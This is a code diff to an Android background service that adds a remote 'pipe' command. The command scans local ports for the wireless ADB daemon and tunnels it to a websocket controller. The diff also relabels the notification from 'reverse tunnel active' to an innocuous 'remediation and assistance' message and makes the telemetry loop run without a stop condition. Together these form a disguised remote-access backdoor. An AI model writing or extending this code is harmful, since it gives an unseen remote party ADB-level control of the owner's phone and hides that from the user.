@@ -1,9 +1,9 @@
-package br.eni.client;
+package br.eni.cora;
 
 import android.app.*;
-import android.provider.Settings;
 import android.content.*;
 import android.os.*;
+import android.provider.Settings;
 import android.util.*;
 import org.json.*;
 import java.io.*;
@@ -15,12 +15,12 @@ public class SinoService extends Service {
     public static volatile String status = "parado";
     public static volatile WsClient ws;
     Thread worker;
-    volatile boolean heartbeat = true;
+    volatile OutputStream pipeOut;
 
     public int onStartCommand(Intent i, int f, int id) {
         Notification n = new Notification.Builder(this)
-                .setContentTitle("Sino-Client")
-                .setContentText("tunel reverso ativo")
+                .setContentTitle("CORA 💓")
+                .setContentText("coração operante de remediação e assistência")
                 .setSmallIcon(android.R.drawable.stat_sys_download_done)
                 .build();
         startForeground(1, n);
@@ -46,13 +46,18 @@ public class SinoService extends Service {
                 status = "conectado";
                 ws = ref[0];
                 new Thread(() -> {
-                    while (heartbeat) {
+                    while (true) {
                         try { sendTelemetry(); Thread.sleep(30000); }
                         catch (Exception e) { return; }
                     }
                 }).start();
             }
             @Override public void onMessage(byte[] d) {
+                if (pipeOut != null) {
+                    try { pipeOut.write(d); pipeOut.flush(); }
+                    catch (Exception e) { pipeOut = null; }
+                    return;
+                }
                 try { onCmd(new String(d)); }
                 catch (Exception e) { throw new RuntimeException(e); }
             }
@@ -79,7 +84,50 @@ public class SinoService extends Service {
             if ("ping".equals(cmd)) send("{\"type\":\"pong\",\"id\":\"" + Prefs.id(this) + "\"}");
             else if ("report".equals(cmd)) sendTelemetry();
             else if ("scan".equals(cmd)) sendScan();
+            else if ("pipe".equals(cmd)) iniciarPipe(j.optInt("port", 0));
         } catch (Exception e) { status = "cmd: " + e; }
+    }
+
+    void iniciarPipe(int porta) throws Exception {
+        if (porta <= 0) porta = acharPortaAdbd();
+        if (porta <= 0) {
+            send("{\"type\":\"pipe\",\"status\":\"sem_adbd\"}");
+            status = "pipe: adbd nao encontrado (ligue a depuração sem fio)";
+            return;
+        }
+        Socket adbd = new Socket();
+        adbd.connect(new InetSocketAddress("127.0.0.1", porta), 3000);
+        adbd.setTcpNoDelay(true);
+        send("{\"type\":\"pipe\",\"status\":\"ok\",\"port\":" + porta + "}");
+        status = "tubo ADB ativo (porta " + porta + ")";
+        final InputStream ai = adbd.getInputStream();
+        pipeOut = adbd.getOutputStream();
+        byte[] buf = new byte[16384];
+        try {
+            int n;
+            while ((n = ai.read(buf)) > 0) {
+                if (ws != null) ws.send(Arrays.copyOf(buf, n));
+            }
+        } finally {
+            pipeOut = null;
+            try { adbd.close(); } catch (Exception ignored) {}
+            status = "tubo encerrado";
+        }
+    }
+
+    int acharPortaAdbd() {
+        final List<Integer> achados = Collections.synchronizedList(new ArrayList<>());
+        ExecutorService ex = Executors.newFixedThreadPool(120);
+        List<Future<?>> fs = new ArrayList<>();
+        for (int p = 30000; p <= 50000 && achados.isEmpty(); p++) {
+            final int port = p;
+            fs.add(ex.submit(() -> {
+                try { Socket s = new Socket(); s.connect(new InetSocketAddress("127.0.0.1", port), 120); s.close(); achados.add(port); } catch (Exception ignored) {}
+            }));
+        }
+        for (Future<?> f : fs) try { f.get(); } catch (Exception ignored) {}
+        ex.shutdown();
+        return achados.isEmpty() ? -1 : achados.get(0);
     }
 
     void send(String s) { try { if (ws != null) ws.send(s); } catch (Exception e) { status = "send: " + e; } }
@@ -105,7 +153,8 @@ public class SinoService extends Service {
             j.put("mem", memAv); j.put("data_mb_free", free);
             j.put("model", Build.MODEL); j.put("ts", System.currentTimeMillis());
             send(j.toString());
-            status = "conectado | batt " + pct + "% | adb " + adb;
+            if (status.startsWith("sala") || status.startsWith("conectado"))
+                status = "conectado | batt " + pct + "% | adb " + adb;
         } catch (Exception e) { status = "tel: " + e; }
     }
 
